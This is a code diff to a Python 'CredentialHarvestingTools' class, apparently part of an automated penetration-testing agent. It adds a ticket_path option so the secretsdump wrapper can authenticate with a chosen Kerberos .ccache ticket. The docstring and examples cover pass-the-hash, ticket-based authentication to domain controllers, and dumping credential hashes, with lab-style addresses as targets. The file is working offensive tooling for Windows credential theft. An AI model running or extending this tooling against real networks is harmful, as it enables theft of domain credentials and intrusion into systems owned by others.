@@ -958,6 +958,7 @@ class CredentialHarvestingTools(Toolset):
         domain: str | None = None,
         dc_ip: str | None = None,
         no_pass: bool = False,
+        ticket_path: str | None = None,
         timeout_minutes: int = 3,
         connection_timeout: int = 30,
         skip_connectivity_check: bool = False,
@@ -976,7 +977,8 @@ class CredentialHarvestingTools(Toolset):
             hash: NTLM hash for pass-the-hash authentication (optional)
             domain: Domain name (optional, can be inferred)
             dc_ip: Domain controller IP address (recommended for DC targets to avoid DNS issues)
-            no_pass: If True, use Kerberos golden ticket authentication
+            no_pass: If True, use Kerberos ticket authentication (-k -no-pass)
+            ticket_path: Path to .ccache ticket file for Kerberos auth (default: Administrator.ccache)
             timeout_minutes: Maximum time to spend dumping (default: 3)
             connection_timeout: Timeout for initial SMB connection in seconds (default: 30)
             skip_connectivity_check: Skip the SMB port check (default: False)
@@ -987,7 +989,8 @@ class CredentialHarvestingTools(Toolset):
         Example:
             >>> secretsdump("192.168.56.100", "admin", password="pass")  # pragma: allowlist secret
             >>> secretsdump("192.168.56.100", "admin", hash="aad3b4...")
-            >>> secretsdump("domain.local", "admin", no_pass=True)
+            >>> secretsdump("dc01.domain.local", "Administrator", no_pass=True)
+            >>> secretsdump("dc01.domain.local", "Administrator", no_pass=True, ticket_path="admin.ccache")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if hash and not is_ntlm_hash(hash):
@@ -1034,7 +1037,8 @@ class CredentialHarvestingTools(Toolset):
         cmd.append(target_string)
 
         if no_pass:
-            cmd = ["env", "KRB5CCNAME=Administrator.ccache"] + cmd
+            ccache_file = ticket_path or "Administrator.ccache"
+            cmd = ["env", f"KRB5CCNAME={ccache_file}"] + cmd
 
         try:
             logger.info(f"[*] Running secretsdump on {target} with {username}")
